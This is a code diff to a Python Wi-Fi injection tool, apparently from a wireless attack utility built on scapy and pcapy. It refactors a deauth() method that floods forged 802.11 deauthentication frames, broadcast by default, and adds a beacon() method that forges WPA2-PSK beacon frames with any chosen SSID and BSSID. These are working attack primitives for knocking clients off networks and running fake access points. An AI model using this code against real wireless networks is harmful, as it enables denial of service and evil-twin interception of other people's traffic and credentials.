@@ -11,6 +11,24 @@ from scapy.all import Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth, Dot11
 
 class WiFi_Parser:
 	def __init__(self, pkt):
+
+		self.channel_freqs = {
+			1: 2412,
+			2: 2417,
+			3: 2422,
+			4: 2427,
+			5: 2432,
+			6: 2437,
+			7: 2442,
+			8: 2447,
+			9: 2452,
+			10: 2457,
+			11: 2462,
+			12: 2467,
+			13: 2472,
+			14: 2484
+		}
+
 		
 		self.freq_channels = {
 			2412: 1,
@@ -420,13 +438,33 @@ class WiFiInject:
 		self.interface = interface
 		self.bssid = bssid
 		self.client = client if not client is None else 'ff:ff:ff:ff:ff:ff'
+		self.pcap = pcapy.open_live(self.interface, 65535, 0, 0)
 
 	def deauth(self, reason_code=3, attempts=3, packets=127, timeout=1, callback=None):
-		pcap = pcapy.open_live(self.interface, 100, 1, 9)
 		for attempt in range(attempts):
 			if callback and callable(callback):
 				callback(attempt +1, attempts, self.bssid, self.client, reason_code)
 			for seq_num in range(packets):
 				deauth_pkt = bytes(RadioTap() / Dot11(addr1=self.client, addr2=self.bssid, addr3=self.bssid, SC=(seq_num << 4)) / Dot11Deauth(reason=reason_code))
-				pcap.sendpacket(deauth_pkt)
+				self.pcap.sendpacket(deauth_pkt)
 			time.sleep(timeout)
+	
+	def beacon(self, ssid, bssid, channel, SC=0):
+		rsn_info = (
+			b'\x01\x00'              # RSN Version (1)
+			b'\x00\x0f\xac\x04'      # Group Cipher Suite (AES-CCMP)
+			b'\x01\x00'              # Pairwise Cipher Suite Count (1)
+			b'\x00\x0f\xac\x04'      # Pairwise Cipher Suite (AES-CCMP)
+			b'\x01\x00'              # Authentication Suite Count (1)
+			b'\x00\x0f\xac\x02'      # Authentication Suite (PSK)
+			b'\x00\x00'              # RSN Capabilities (нет 802.11w)
+		)
+		packet = \
+		        RadioTap() / \
+		        Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid, SC=(SC << 4)) / \
+		        Dot11Beacon() / \
+		        Dot11Elt(ID="SSID", info=ssid, len=len(ssid)) / \
+		        Dot11Elt(ID="DSset", info=chr(channel)) / \
+				Dot11Elt(ID=48, info=rsn_info)
+		pkt = bytes(packet)
+		self.pcap.sendpacket(pkt)
